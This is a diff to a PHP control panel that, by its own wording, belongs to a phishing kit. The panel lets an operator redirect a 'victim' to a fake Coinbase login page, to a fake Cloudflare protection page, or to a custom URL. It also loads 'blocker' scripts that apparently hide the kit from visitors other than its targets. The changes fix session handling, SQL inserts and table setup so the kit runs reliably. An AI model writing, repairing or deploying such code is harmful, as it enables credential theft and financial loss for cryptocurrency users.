@@ -1,20 +1,25 @@
 <?php
 // ==================== PROTECTION START ====================
-require_once __DIR__ . '/admin/auth.php';
-require_login();
-require_once 'blocker.php';
-require_once 'blocker-raw.php';
+// Start session FIRST
+session_start();
 
-// Check if user is admin
+// Then include auth and check login
+require_once __DIR__ . '/admin/auth.php';
+
+// Check if user is logged in - if not, redirect to login
 if (!is_logged_in()) {
-    header('Location: admin/login.php');
+    header('Location: /admin/login.php');
     exit;
 }
+
+// Then include protection scripts
+require_once __DIR__ . '/blocker.php';
+require_once __DIR__ . '/blocker-raw.php';
 
 // Handle logout
 if (isset($_GET['action']) && $_GET['action'] === 'logout') {
     logout();
-    header('Location: admin/login.php');
+    header('Location: /admin/login.php');
     exit;
 }
 
@@ -30,23 +35,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['redirect_command'])) 
     switch($command) {
         case 'redirect_to_coinbase':
             $query = "INSERT INTO redirect_commands (command, target, created_at) 
-                     VALUES ('redirect', 'coinbaselogin.html', NOW())
-                     ON CONFLICT (id) DO UPDATE SET target = 'coinbaselogin.html', created_at = NOW()";
+                     VALUES ('redirect', 'coinbaselogin.html', NOW())";
             $_SESSION['success_message'] = 'Victim will be redirected to Coinbase Login';
             break;
             
         case 'redirect_to_cloudflare':
             $query = "INSERT INTO redirect_commands (command, target, created_at) 
-                     VALUES ('redirect', 'index.php', NOW())
-                     ON CONFLICT (id) DO UPDATE SET target = 'index.php', created_at = NOW()";
+                     VALUES ('redirect', 'index.php', NOW())";
             $_SESSION['success_message'] = 'Victim will be redirected to Cloudflare Protection';
             break;
             
         case 'redirect_custom':
             if (!empty($target)) {
                 $query = "INSERT INTO redirect_commands (command, target, created_at) 
-                         VALUES ('redirect', :target, NOW())
-                         ON CONFLICT (id) DO UPDATE SET target = :target, created_at = NOW()";
+                         VALUES ('redirect', :target, NOW())";
                 $stmt = $db->prepare($query);
                 $stmt->execute([':target' => $target]);
                 $_SESSION['success_message'] = 'Victim will be redirected to: ' . $target;
@@ -65,13 +67,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['redirect_command'])) 
         $db->exec($query);
     }
     
-    header('Location: panel.php');
+    header('Location: /panel.php');
     exit;
 }
 
 // Get current redirect status from database
 $database = new Database();
 $db = $database->getConnection();
+
+// Create redirect_commands table if not exists
+$create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
+    id SERIAL PRIMARY KEY,
+    command VARCHAR(50) NOT NULL,
+    target TEXT NOT NULL,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)";
+$db->exec($create_table);
+
 $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
 $stmt = $db->query($query);
 $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
@@ -87,15 +99,6 @@ if (isset($_SESSION['error_message'])) {
     $error_message = $_SESSION['error_message'];
     unset($_SESSION['error_message']);
 }
-
-// Create redirect_commands table if not exists
-$create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
-    id SERIAL PRIMARY KEY,
-    command VARCHAR(50) NOT NULL,
-    target TEXT NOT NULL,
-    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-)";
-$db->exec($create_table);
 // ==================== PROTECTION END ====================
 ?>
 <!DOCTYPE html>
@@ -398,15 +401,9 @@ $db->exec($create_table);
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
     <script>
-        // Initialize components
         document.addEventListener('DOMContentLoaded', function() {
             M.updateTextFields();
         });
-
-        // Auto-refresh status every 10 seconds
-        setInterval(() => {
-            location.reload();
-        }, 10000);
     </script>
 </body>
 </html>
